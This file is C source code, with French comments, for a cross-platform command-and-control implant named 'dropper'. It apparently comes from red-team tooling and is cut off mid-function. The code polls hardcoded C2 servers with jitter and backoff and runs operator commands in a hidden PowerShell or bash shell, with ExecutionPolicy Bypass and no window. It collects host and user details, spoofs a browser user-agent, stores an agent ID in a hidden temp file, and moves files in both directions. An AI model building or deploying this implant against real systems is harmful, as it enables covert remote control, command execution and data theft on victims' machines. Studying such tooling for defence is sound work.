/*
 * ============================================================
 *  agents/c/dropper.c — Agent C2 complet (dropper)
 *
 *  Fonctionnalités identiques à l'agent Python :
 *    - Shell persistant (PowerShell / bash --norc)
 *    - Sortie propre : pas de prompt, pas d'ANSI, pas de sentinel
 *    - Persistance agent_id dans .agent_id
 *    - Modules : shell, upload, download, sysinfo
 *    - Jitter + backoff exponentiel
 *    - Reconnexion automatique
 *
 *  Compilation Windows: gcc dropper.c cJSON.c -o agent.exe
 *                         -lwinhttp -lws2_32 -static-libgcc -O2 -s -DPLATFORM_WINDOWS
 *                         (MSYS2 MinGW64 — aucune DLL externe requise)
 *  Compilation Linux  : gcc dropper.c cJSON.c -o agent_linux -lcurl -lpthread -lm
 * ============================================================
 */

/* ── Détection plateforme ──────────────────────────────────── */
#ifdef _WIN32
    #define PLATFORM_WINDOWS 1
    #include <winsock2.h>   /* DOIT être avant windows.h */
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <winhttp.h>    /* HTTP natif Windows — remplace libcurl */
    #include <lmcons.h>
#else
    #define PLATFORM_LINUX 1
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <poll.h>
    #include <pwd.h>
    #include <signal.h>
    #include <curl/curl.h>  /* Linux uniquement */
    #include <sys/stat.h>   /* stat() / S_ISDIR — détection dossier upload */
    extern char **environ;
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "cJSON.h"


/* ============================================================
 *  CONFIGURATION
 * ============================================================ */

/* ── Liste des serveurs C2 (Cobalt Strike / Havoc style) ──
 *  Hardcodée dans le binaire — aucun argument CLI.
 *  L'agent essaie chaque URL dans l'ordre jusqu'au premier
 *  qui répond. Compilez un binaire différent par engagement.   */
static const char *C2_SERVER_LIST[] = {
    "http://192.168.8.1:8000",   /* Infra principale (VMware NAT)    */
    "http://192.168.100.1:8000", /* Réseau secondaire (fallback)     */
    "http://127.0.0.1:8000",     /* Localhost (tests locaux)         */
    NULL
};

#define POLL_INTERVAL_MS  3000
#define JITTER_PERCENT    40
#define HTTP_TIMEOUT_SEC  10
#define CMD_TIMEOUT_MS    30000          /* 30s timeout exécution commande  */
#define MAX_OUTPUT_SIZE   131072         /* 128KB résultat max               */
#define LINE_BUF_SIZE     4096

static const int BACKOFF_DELAYS[] = {3, 6, 12, 24, 60};
#define BACKOFF_COUNT (sizeof(BACKOFF_DELAYS) / sizeof(BACKOFF_DELAYS[0]))


/* ============================================================
 *  STRUCTURES
 * ============================================================ */

typedef struct { char *data; size_t size; } HttpBuffer;
typedef struct { char hostname[256]; char username[128]; char os[256]; } SystemInfo;

typedef struct {
    int  has_task;
    char task_id[32];
    char command[4096];
    char module[32];
    char file_data[MAX_OUTPUT_SIZE];
    char filename[256];   /* nom du fichier source pour upload (ex: "test.txt") */
} PollResponse;

typedef struct {
    char server_url[256];
    char agent_id[16];
    int  reconnect_attempts;
    int  running;
} AgentContext;

/* Shell persistant cross-platform */
typedef struct {
    char shell_type[16];    /* "powershell" ou "bash" */
    int  alive;

#ifdef PLATFORM_WINDOWS
    HANDLE       hStdinWrite;
    HANDLE       hStdoutRead;
    PROCESS_INFORMATION pi;
#else
    int   fd_stdin_write;
    int   fd_stdout_read;
    pid_t pid;
#endif
} PersistentShell;


/* ============================================================
 *  UTILITAIRES GÉNÉRAUX
 * ============================================================ */

static void sleep_ms(int ms) {
#ifdef PLATFORM_WINDOWS
    Sleep(ms);
#else
    struct timespec ts = { ms / 1000, (ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
#endif
}

static int get_jittered_interval(void) {
    int jitter  = (POLL_INTERVAL_MS * JITTER_PERCENT) / 100;
    int min_val = POLL_INTERVAL_MS - jitter;
    int max_val = POLL_INTERVAL_MS + jitter;
    return min_val + (rand() % (max_val - min_val + 1));
}

static int get_backoff_delay(AgentContext *ctx) {
    int idx = ctx->reconnect_attempts;
    if (idx >= (int)BACKOFF_COUNT) idx = (int)BACKOFF_COUNT - 1;
    ctx->reconnect_attempts++;
    return BACKOFF_DELAYS[idx];
}

static void get_agent_id_filepath(char *out, size_t n) {
#ifdef PLATFORM_WINDOWS
    char tmp[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) strncpy(tmp, "C:\\Windows\\Temp\\", MAX_PATH - 1);
    snprintf(out, n, "%s.agent_id", tmp);
#else
    strncpy(out, "/tmp/.agent_id", n - 1);
    out[n - 1] = '\0';
#endif
}


/* ============================================================
 *  NETTOYAGE DE SORTIE
 *  Supprime : codes ANSI, prompts bash/PowerShell, lignes vides en excès
 * ============================================================ */

/**
 * Supprime les séquences d'échappement ANSI/VT100 (couleurs, positionnement).
 * Parcourt le buffer caractère par caractère et élimine ESC[...m et variantes.
 */
static void strip_ansi(char *buf) {
    char *src = buf, *dst = buf;
    while (*src) {
        if (*src == '\x1b') {
            src++;
            if (*src == '[') {
                src++;
                /* Saute jusqu'à la lettre terminale (a-zA-Z) */
                while (*src && !((*src >= 'A' && *src <= 'Z') ||
                                  (*src >= 'a' && *src <= 'z'))) src++;
                if (*src) src++;
            } else if (*src == ']') {
                /* OSC sequence : ESC ] ... BEL ou ST */
                while (*src && *src != '\x07' && *src != '\x1b') src++;
                if (*src == '\x07') src++;
            }
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

/**
 * Indique si une ligne ressemble à un prompt bash ou PowerShell.
 * bash   : lignes commençant par "┌──", "└─$", "└─#", "[user@host]$", "user@host:$"
 * pwsh   : lignes commençant par "PS " suivi d'un chemin
 */
static int is_prompt_line(const char *line, const char *shell_type) {
    if (strcmp(shell_type, "bash") == 0) {
        /* Prompt Kali multi-lignes */
        if (strncmp(line, "\xe2\x94\x8c", 3) == 0) return 1;  /* ┌ UTF-8 */
        if (strncmp(line, "\xe2\x94\x94", 3) == 0) return 1;  /* └ UTF-8 */
        /* Prompt classique user@host:path$ */
        const char *at = strchr(line, '@');
        const char *co = at ? strchr(at, ':') : NULL;
        if (at && co) {
            const char *end = line + strlen(line) - 1;
            while (end > line && (*end == ' ' || *end == '\r' || *end == '\n')) end--;
            if (*end == '$' || *end == '#') return 1;
        }
        /* bash-5.1$ style */
        if (strncmp(line, "bash-", 5) == 0) return 1;
    } else if (strcmp(shell_type, "powershell") == 0) {
        if (strncmp(line, "PS ", 3) == 0) return 1;
    }
    return 0;
}

/**
 * Nettoie la sortie brute du shell :
 *   1. Strip ANSI
 *   2. Supprime les lignes de prompt
 *   3. Supprime toute ligne contenant le sentinel
 *   4. Normalise \r\n → \n
 *   5. Trim global
 */
static void clean_output(char *buf, const char *shell_type, const char *sentinel) {
    strip_ansi(buf);

    /* Normalise \r\n */
    char *p = buf;
    char *q = buf;
    while (*p) {
        if (*p == '\r' && *(p + 1) == '\n') { p++; }
        else if (*p == '\r') { *q++ = '\n'; p++; }
        else { *q++ = *p++; }
    }
    *q = '\0';

    /* Traitement ligne par ligne */
    char tmp[MAX_OUTPUT_SIZE];
    tmp[0] = '\0';
    size_t tmp_pos = 0;

    char *line = buf;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        size_t len = nl ? (size_t)(nl - line) : strlen(line);

        /* Copie la ligne dans un buffer temporaire pour tests */
        char linebuf[LINE_BUF_SIZE];
        size_t copy_len = len < LINE_BUF_SIZE - 1 ? len : LINE_BUF_SIZE - 1;
        strncpy(linebuf, line, copy_len);
        linebuf[copy_len] = '\0';

        /* Supprime \r résiduel */
        if (copy_len > 0 && linebuf[copy_len - 1] == '\r') linebuf[--copy_len] = '\0';

        int skip = 0;
        if (strstr(linebuf, sentinel))              skip = 1;
        /* Filet universel : supprime tout résidu sentinel C2 (__C2_INIT_READY__, etc.) */
        if (!skip && strstr(linebuf, "__C2_"))      skip = 1;
        if (!skip && is_prompt_line(linebuf, shell_type)) skip = 1;

        if (!skip && tmp_pos + copy_len + 2 < MAX_OUTPUT_SIZE) {
            strncpy(tmp + tmp_pos, linebuf, copy_len);
            tmp_pos += copy_len;
            tmp[tmp_pos++] = '\n';
        }

        line = nl ? nl + 1 : NULL;
    }
    tmp[tmp_pos] = '\0';

    /* Supprime les lignes vides multiples consécutives */
    char result[MAX_OUTPUT_SIZE];
    size_t rpos = 0;
    int blank_count = 0;
    char *rline = tmp;
    while (rline && *rline) {
        char *rnl = strchr(rline, '\n');
        size_t rlen = rnl ? (size_t)(rnl - rline) : strlen(rline);
        if (rlen == 0) {
            blank_count++;
            if (blank_count <= 1 && rpos > 0)
                result[rpos++] = '\n';
        } else {
            blank_count = 0;
            if (rpos + rlen + 2 < MAX_OUTPUT_SIZE) {
                strncpy(result + rpos, rline, rlen);
                rpos += rlen;
                result[rpos++] = '\n';
            }
        }
        rline = rnl ? rnl + 1 : NULL;
    }
    result[rpos] = '\0';

    /* Trim final */
    while (rpos > 0 && (result[rpos - 1] == '\n' || result[rpos - 1] == ' '))
        result[--rpos] = '\0';

    strncpy(buf, result, MAX_OUTPUT_SIZE - 1);
    buf[MAX_OUTPUT_SIZE - 1] = '\0';
}


/* ============================================================
 *  LECTURE LIGNE AVEC TIMEOUT (cross-platform)
 * ============================================================ */

#ifdef PLATFORM_LINUX
/**
 * Lit une ligne depuis un fd avec timeout en millisecondes.
 * Utilise poll() pour éviter tout blocage.
 * Retourne le nombre d'octets lus, 0 si EOF, -1 si timeout/erreur.
 */
static int readline_timeout(int fd, char *buf, size_t buf_size, int timeout_ms) {
    size_t pos = 0;
    int    remaining = timeout_ms;

    while (pos < buf_size - 1 && remaining > 0) {
        struct pollfd pfd = { fd, POLLIN, 0 };
        int wait = remaining > 500 ? 500 : remaining;
        int ret  = poll(&pfd, 1, wait);
        remaining -= wait;

        if (ret <= 0) continue;

        char c;
        ssize_t n = read(fd, &c, 1);
        if (n <= 0) return (int)pos;

        buf[pos++] = c;
        if (c == '\n') break;
    }
    buf[pos] = '\0';
    return (pos > 0) ? (int)pos : -1;
}
#else
/**
 * Lit une ligne depuis un HANDLE Windows avec timeout.
 * Utilise PeekNamedPipe pour éviter tout blocage.
 */
static int readline_timeout_win(HANDLE hRead, char *buf, size_t buf_size, int timeout_ms) {
    size_t pos     = 0;
    DWORD  start   = GetTickCount();

    while (pos < buf_size - 1) {
        DWORD elapsed = GetTickCount() - start;
        if ((int)elapsed >= timeout_ms) return (pos > 0) ? (int)pos : -1;

        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) return -1;

        if (avail == 0) { Sleep(30); continue; }

        char  c;
        DWORD nRead = 0;
        if (!ReadFile(hRead, &c, 1, &nRead, NULL) || nRead == 0) return -1;

        buf[pos++] = c;
        if (c == '\n') break;
    }
    buf[pos] = '\0';
    return (int)pos;
}
#endif


/* ============================================================
 *  SHELL PERSISTANT
 * ============================================================ */

/**
 * Démarre le shell persistant.
 *
 * Windows : powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass
 *           → pas d'echo des commandes, sortie propre
 *
 * Linux   : /bin/bash --norc --noprofile
 *           avec PS1='' PS2='' TERM=dumb dans l'environnement
 *           → pas de prompt fancy (Kali, Ubuntu, etc.)
 */
static int shell_start(PersistentShell *sh) {
#ifdef PLATFORM_WINDOWS
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdinRead, hStdoutWrite;

    if (!CreatePipe(&hStdinRead,      &sh->hStdinWrite,  &sa, 0)) return 0;
    if (!CreatePipe(&sh->hStdoutRead, &hStdoutWrite,     &sa, 0)) return 0;

    /* Stdin write et stdout read ne doivent pas être héritables */
    SetHandleInformation(sh->hStdinWrite,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(sh->hStdoutRead,  HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = hStdinRead;
    si.hStdOutput  = hStdoutWrite;
    si.hStdError   = hStdoutWrite;

    ZeroMemory(&sh->pi, sizeof(sh->pi));

    char cmdline[] = "powershell.exe -NoLogo -NoProfile -NonInteractive "
                     "-ExecutionPolicy Bypass -Command -";

    BOOL ok = CreateProcessA(
        NULL, cmdline, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &sh->pi
    );

    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);

    if (!ok) return 0;

    strncpy(sh->shell_type, "powershell", sizeof(sh->shell_type) - 1);
    sh->alive = 1;

    /* Vide la bannière de démarrage */
    char drain_cmd[] = "Write-Host '__C2_INIT_READY__'\n";
    DWORD nw;
    WriteFile(sh->hStdinWrite, drain_cmd, (DWORD)strlen(drain_cmd), &nw, NULL);

    char linebuf[LINE_BUF_SIZE];
    for (int i = 0; i < 50; i++) {
        readline_timeout_win(sh->hStdoutRead, linebuf, sizeof(linebuf), 200);
        if (strstr(linebuf, "__C2_INIT_READY__")) break;
    }
    return 1;

#else /* PLATFORM_LINUX */
    int stdin_pipe[2], stdout_pipe[2];
    if (pipe(stdin_pipe) < 0 || pipe(stdout_pipe) < 0) return 0;

    /* Construit l'environnement : hérite du parent mais force PS1/PS2/TERM */
    int env_count = 0;
    while (environ[env_count]) env_count++;

    char **new_env = malloc((env_count + 5) * sizeof(char *));
    if (!new_env) return 0;

    int j = 0;
    for (int i = 0; environ[i]; i++) {
        if (strncmp(environ[i], "PS1=",  4) != 0 &&
            strncmp(environ[i], "PS2=",  4) != 0 &&
            strncmp(environ[i], "TERM=", 5) != 0) {
            new_env[j++] = environ[i];
        }
    }
    new_env[j++] = "PS1=";
    new_env[j++] = "PS2=";
    new_env[j++] = "TERM=dumb";
    new_env[j]   = NULL;

    pid_t pid = fork();
    if (pid < 0) { free(new_env); return 0; }

    if (pid == 0) {
        /* Processus enfant */
        dup2(stdin_pipe[0],  STDIN_FILENO);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stdout_pipe[1], STDERR_FILENO);
        close(stdin_pipe[0]); close(stdin_pipe[1]);
        close(stdout_pipe[0]); close(stdout_pipe[1]);

        char *args[] = { "/bin/bash", "--norc", "--noprofile", NULL };
        execve("/bin/bash", args, new_env);
        _exit(1);
    }

    /* Processus parent */
    free(new_env);
    close(stdin_pipe[0]);
    close(stdout_pipe[1]);

    sh->fd_stdin_write  = stdin_pipe[1];
    sh->fd_stdout_read  = stdout_pipe[0];
    sh->pid             = pid;
    strncpy(sh->shell_type, "bash", sizeof(sh->shell_type) - 1);
    sh->alive = 1;

    /* Vide le démarrage */
    char drain_cmd[] = "printf '%s\\n' '__C2_INIT_READY__'\n";
    write(sh->fd_stdin_write, drain_cmd, strlen(drain_cmd));

    char linebuf[LINE_BUF_SIZE];
    for (int i = 0; i < 50; i++) {
        readline_timeout(sh->fd_stdout_read, linebuf, sizeof(linebuf), 200);
        if (strstr(linebuf, "__C2_INIT_READY__")) break;
    }
    return 1;
#endif
}

/**
 * Vérifie si le shell est encore actif.
 */
static int shell_is_alive(PersistentShell *sh) {
    if (!sh->alive) return 0;
#ifdef PLATFORM_WINDOWS
    DWORD code;
    if (!GetExitCodeProcess(sh->pi.hProcess, &code)) return 0;
    return (code == STILL_ACTIVE);
#else
    if (sh->pid <= 0) return 0;
    return (waitpid(sh->pid, NULL, WNOHANG) == 0);
#endif
}

/**
 * Arrête et redémarre le shell.
 */
static int shell_restart(PersistentShell *sh) {
    sh->alive = 0;
#ifdef PLATFORM_WINDOWS
    if (sh->pi.hProcess) {
        TerminateProcess(sh->pi.hProcess, 0);
        CloseHandle(sh->pi.hProcess);
        CloseHandle(sh->pi.hThread);
    }
    if (sh->hStdinWrite)  CloseHandle(sh->hStdinWrite);
    if (sh->hStdoutRead)  CloseHandle(sh->hStdoutRead);
    ZeroMemory(sh, sizeof(PersistentShell));
#else
    if (sh->pid > 0) {
        kill(sh->pid, SIGTERM);
        sleep_ms(300);
        kill(sh->pid, SIGKILL);
        waitpid(sh->pid, NULL, WNOHANG);
    }
    if (sh->fd_stdin_write  >= 0) close(sh->fd_stdin_write);
    if (sh->fd_stdout_read  >= 0) close(sh->fd_stdout_read);
    memset(sh, 0, sizeof(PersistentShell));
    sh->fd_stdin_write = sh->fd_stdout_read = -1;
#endif
    return shell_start(sh);
}

/**
 * Envoie une chaîne dans le stdin du shell.
 */
static int shell_write(PersistentShell *sh, const char *data) {
    size_t len = strlen(data);
#ifdef PLATFORM_WINDOWS
    DWORD nw;
    return WriteFile(sh->hStdinWrite, data, (DWORD)len, &nw, NULL) ? 1 : 0;
#else
    return (write(sh->fd_stdin_write, data, len) == (ssize_t)len) ? 1 : 0;
#endif
}

/**
 * Exécute une commande dans le shell persistant.
 *
 * Mécanisme sentinel :
 *   1. Envoie la commande dans stdin
 *   2. Envoie immédiatement un marqueur unique dans stdin
 *   3. Lit stdout ligne par ligne jusqu'à trouver le marqueur
 *   4. Nettoie la sortie (ANSI, prompts, sentinel)
 *
 * Retourne 1 si succès, 0 si timeout/erreur.
 */
static int shell_run(PersistentShell *sh, const char *command,
                     const char *task_id, char *out, size_t out_size) {

    if (!shell_is_alive(sh)) {
        if (!shell_restart(sh)) {
            strncpy(out, "[ERREUR] Shell indisponible", out_size - 1);
            return 0;
        }
    }

    /* Construit le sentinel unique pour cette tâche */
    char sentinel[64];
    snprintf(sentinel, sizeof(sentinel), "__C2_DONE_%s__", task_id);

    /* Commande d'impression du sentinel selon le shell */
    char sentinel_cmd[128];
    if (strcmp(sh->shell_type, "powershell") == 0)
        snprintf(sentinel_cmd, sizeof(sentinel_cmd), "Write-Host '%s'\n", sentinel);
    else
        snprintf(sentinel_cmd, sizeof(sentinel_cmd), "printf '%%s\\n' '%s'\n", sentinel);

    /* Envoie commande + sentinel */
    char full_cmd[4096 + 128];
    snprintf(full_cmd, sizeof(full_cmd), "%s\n%s", command, sentinel_cmd);
    if (!shell_write(sh, full_cmd)) {
        strncpy(out, "[ERREUR] Écriture stdin échouée", out_size - 1);
        return 0;
    }

    /* Collecte les lignes jusqu'au sentinel */
    char     raw[MAX_OUTPUT_SIZE];
    size_t   raw_pos  = 0;
    int      found    = 0;
    int      timeout  = CMD_TIMEOUT_MS;
    char     linebuf[LINE_BUF_SIZE];

    while (!found && timeout > 0) {
        int per_read = 500;
#ifdef PLATFORM_WINDOWS
        int n = readline_timeout_win(sh->hStdoutRead, linebuf, sizeof(linebuf), per_read);
#else
        int n = readline_timeout(sh->fd_stdout_read, linebuf, sizeof(linebuf), per_read);
#endif
        timeout -= per_read;

        if (n <= 0) {
            if (!shell_is_alive(sh)) {
                shell_restart(sh);
                strncpy(out, "[ERREUR] Shell interrompu pendant l'exécution", out_size - 1);
                return 0;
            }
            continue;
        }

        if (strstr(linebuf, sentinel)) { found = 1; break; }

        if (raw_pos + (size_t)n < MAX_OUTPUT_SIZE - 1) {
            memcpy(raw + raw_pos, linebuf, n);
            raw_pos += n;
        }
    }

    raw[raw_pos] = '\0';

    if (!found) {
        strncpy(out, "[TIMEOUT] Commande interrompue après 30s", out_size - 1);
        return 0;
    }

    clean_output(raw, sh->shell_type, sentinel);
    strncpy(out, raw, out_size - 1);
    out[out_size - 1] = '\0';

    if (strlen(out) == 0) strncpy(out, "(pas de sortie)", out_size - 1);
    return 1;
}


/* ============================================================
 *  COLLECTE D'INFORMATIONS SYSTÈME
 * ============================================================ */

static void collect_system_info(SystemInfo *info) {
    memset(info, 0, sizeof(SystemInfo));
#ifdef PLATFORM_WINDOWS
    DWORD size = sizeof(info->hostname);
    GetComputerNameA(info->hostname, &size);
    size = sizeof(info->username);
    GetUserNameA(info->username, &size);

    typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll");
    RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (fn) {
        RTL_OSVERSIONINFOW rovi = {0};
        rovi.dwOSVersionInfoSize = sizeof(rovi);
        fn(&rovi);
        snprintf(info->os, sizeof(info->os), "Windows %lu.%lu Build %lu",
                 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
    } else {
        strncpy(info->os, "Windows", sizeof(info->os) - 1);
    }
#else
    struct utsname uts;
    uname(&uts);
    gethostname(info->hostname, sizeof(info->hostname) - 1);
    struct passwd *pw = getpwuid(getuid());
    strncpy(info->username, pw ? pw->pw_name : (getenv("USER") ?: "unknown"),
            sizeof(info->username) - 1);
    snprintf(info->os, sizeof(info->os), "%s %s", uts.sysname, uts.release);
#endif
}

/**
 * Construit un rapport système détaillé (module sysinfo).
 * Données : OS, hostname, username, CWD, PID, IP locale, architecture.
 */
static void build_sysinfo(const SystemInfo *si, char *out, size_t out_size) {
    char cwd[512]  = "?";
    char ip[64]    = "?";
    char arch[32]  = "?";

    /* Répertoire courant */
#ifdef PLATFORM_WINDOWS
    GetCurrentDirectoryA(sizeof(cwd), cwd);
    strncpy(arch, sizeof(void*) == 8 ? "x86_64" : "x86", sizeof(arch) - 1);
#else
    if (!getcwd(cwd, sizeof(cwd))) strncpy(cwd, "?", sizeof(cwd) - 1);
    strncpy(arch, sizeof(void*) == 8 ? "x86_64" : "x86", sizeof(arch) - 1);
#endif

    /* IP locale via socket trick */
#ifdef PLATFORM_WINDOWS
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s != INVALID_SOCKET) {
        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port   = htons(80);
        inet_pton(AF_INET, "8.8.8.8", &sin.sin_addr);
        if (connect(s, (struct sockaddr*)&sin, sizeof(sin)) == 0) {
            struct sockaddr_in local;
            int len = sizeof(local);
            getsockname(s, (struct sockaddr*)&local, &len);
            inet_ntop(AF_INET, &local.sin_addr, ip, sizeof(ip));
        }
        closesocket(s);
    }
#else
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port   = htons(80);
        inet_pton(AF_INET, "8.8.8.8", &sin.sin_addr);
        if (connect(s, (struct sockaddr*)&sin, sizeof(sin)) == 0) {
            struct sockaddr_in local;
            socklen_t len = sizeof(local);
            getsockname(s, (struct sockaddr*)&local, &len);
            inet_ntop(AF_INET, &local.sin_addr, ip, sizeof(ip));
        }
        close(s);
    }
#endif

    snprintf(out, out_size,
        "Hostname   : %s\n"
        "Username   : %s\n"
        "OS         : %s\n"
        "Arch       : %s\n"
        "CWD        : %s\n"
#ifdef PLATFORM_WINDOWS
        "PID        : %lu\n"
#else
        "PID        : %d\n"
#endif
        "IP locale  : %s",
        si->hostname, si->username, si->os, arch, cwd,
#ifdef PLATFORM_WINDOWS
        (unsigned long)GetCurrentProcessId(),
#else
        (int)getpid(),
#endif
        ip
    );
}


/* ============================================================
 *  PERSISTANCE AGENT ID
 * ============================================================ */

static int load_saved_agent_id(char *out, size_t n) {
    char path[512];
    get_agent_id_filepath(path, sizeof(path));
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char buf[32] = {0};
    if (fgets(buf, sizeof(buf), f)) {
        size_t len = strlen(buf);
        if (len > 0 && buf[len-1] == '\n') buf[--len] = '\0';
        if (len == 8) { strncpy(out, buf, n-1); fclose(f); return 1; }
    }
    fclose(f);
    return 0;
}

static void save_agent_id(const char *id) {
    char path[512];
    get_agent_id_filepath(path, sizeof(path));
    FILE *f = fopen(path, "w");
    if (f) { fputs(id, f); fclose(f); }
}


/* ============================================================
 *  HTTP
 *  Windows : WinHTTP natif (winhttp.dll inclus dans Windows depuis XP)
 *            → aucune DLL externe, binaire autonome
 *  Linux   : libcurl (pour les tests sur Kali)
 * ============================================================ */

#ifdef PLATFORM_WINDOWS

/**
 * Convertit une chaîne étroite (char*) en chaîne large (wchar_t*).
 * WinHTTP exige des chaînes UTF-16 pour les hôtes et chemins.
 */
static void str_to_wide(const char *src, wchar_t *dst, int dst_sz) {
    MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, dst_sz);
}

/**
 * Décompose une URL "http://host:port/path" en composants séparés.
 * WinHTTP a besoin du host, port et path de manière indépendante.
 */
static void parse_url(const char *url,
                      char *host, size_t host_sz,
                      INTERNET_PORT *port,
                      char *path, size_t path_sz) {
    memset(host, 0, host_sz);
    memset(path, 0, path_sz);
    *port = 80;

    const char *p = url;
    if      (strncmp(p, "https://", 8) == 0) { p += 8; *port = 443; }
    else if (strncmp(p, "http://",  7) == 0) { p += 7; *port = 80;  }

    const char *colon = strchr(p, ':');
    const char *slash = strchr(p, '/');

    if (colon && (!slash || colon < slash)) {
        /* Format : host:port[/path] */
        size_t hlen = (size_t)(colon - p);
        if (hlen >= host_sz) hlen = host_sz - 1;
        memcpy(host, p, hlen);
        *port = (INTERNET_PORT)atoi(colon + 1);
        p = slash ? slash : p + strlen(p);
    } else if (slash) {
        /* Format : host/path (port implicite) */
        size_t hlen = (size_t)(slash - p);
        if (hlen >= host_sz) hlen = host_sz - 1;
        memcpy(host, p, hlen);
        p = slash;
    } else {
        /* Host seul */
        strncpy(host, p, host_sz - 1);
        p += strlen(p);
    }

    if (*p == '/') strncpy(path, p, path_sz - 1);
    else           strncpy(path, "/", path_sz - 1);
}

/**
 * Lit le corps complet d'une réponse WinHTTP dans un HttpBuffer.
 * Réalloue dynamiquement — l'appelant doit free(resp->data).
 */
static void winhttp_read_body(HINTERNET hReq, HttpBuffer *resp) {
    resp->data = malloc(1);
    resp->size = 0;
    if (resp->data) resp->data[0] = '\0';

    char  chunk[8192];
    DWORD n = 0;
    while (WinHttpReadData(hReq, chunk, sizeof(chunk), &n) && n > 0) {
        char *ptr = realloc(resp->data, resp->size + n + 1);
        if (!ptr) break;
        resp->data = ptr;
        memcpy(resp->data + resp->size, chunk, n);
        resp->size += n;
        resp->data[resp->size] = '\0';
    }
}

/**
 * Récupère le code HTTP numérique et lit le corps de la réponse.
 * Retourne -1 si l'interrogation du header échoue.
 */
static long winhttp_status_and_read(HINTERNET hReq, HttpBuffer *resp) {
    DWORD status    = 0;
    DWORD status_sz = sizeof(status);
    BOOL  ok = WinHttpQueryHeaders(
        hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &status, &status_sz,
        WINHTTP_NO_HEADER_INDEX
    );
    if (!ok) {
        resp->data = malloc(1);
        resp->size = 0;
        if (resp->data) resp->data[0] = '\0';
        return -1;
    }
    winhttp_read_body(hReq, resp);
    return (long)status;
}

/**
 * POST JSON via WinHTTP — remplace http_post_json libcurl.
 * Signature identique : retourne le code HTTP ou -1 si erreur réseau.
 */
static long http_post_json(const char *url, const char *json_body,
                           HttpBuffer *resp) {
    char          host[256]  = {0};
    char          path[512]  = {0};
    wchar_t       whost[256] = {0};
    wchar_t       wpath[512] = {0};
    INTERNET_PORT port       = 80;

    parse_url(url, host, sizeof(host), &port, path, sizeof(path));
    str_to_wide(host, whost, 256);
    str_to_wide(path, wpath, 512);

    DWORD tms = (DWORD)(HTTP_TIMEOUT_SEC * 1000);

    HINTERNET hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSess) { resp->data = NULL; resp->size = 0; return -1; }
    WinHttpSetTimeouts(hSess, tms, tms, tms, tms);

    HINTERNET hConn = WinHttpConnect(hSess, whost, port, 0);
    if (!hConn) {
        WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    HINTERNET hReq = WinHttpOpenRequest(
        hConn, L"POST", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0
    );
    if (!hReq) {
        WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    LPCWSTR hdrs     = L"Content-Type: application/json\r\nAccept: application/json";
    DWORD   body_len = (DWORD)strlen(json_body);
    long    code     = -1;

    if (WinHttpSendRequest(hReq, hdrs, (DWORD)-1,
                           (LPVOID)json_body, body_len, body_len, 0)
        && WinHttpReceiveResponse(hReq, NULL)) {
        code = winhttp_status_and_read(hReq, resp);
    } else {
        resp->data = malloc(1);
        resp->size = 0;
        if (resp->data) resp->data[0] = '\0';
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return code;
}

/**
 * GET via WinHTTP — remplace http_get libcurl.
 * Signature identique : retourne le code HTTP ou -1 si erreur réseau.
 */
static long http_get(const char *url, HttpBuffer *resp) {
    char          host[256]  = {0};
    char          path[512]  = {0};
    wchar_t       whost[256] = {0};
    wchar_t       wpath[512] = {0};
    INTERNET_PORT port       = 80;

    parse_url(url, host, sizeof(host), &port, path, sizeof(path));
    str_to_wide(host, whost, 256);
    str_to_wide(path, wpath, 512);

    DWORD tms = (DWORD)(HTTP_TIMEOUT_SEC * 1000);

    HINTERNET hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSess) { resp->data = NULL; resp->size = 0; return -1; }
    WinHttpSetTimeouts(hSess, tms, tms, tms, tms);

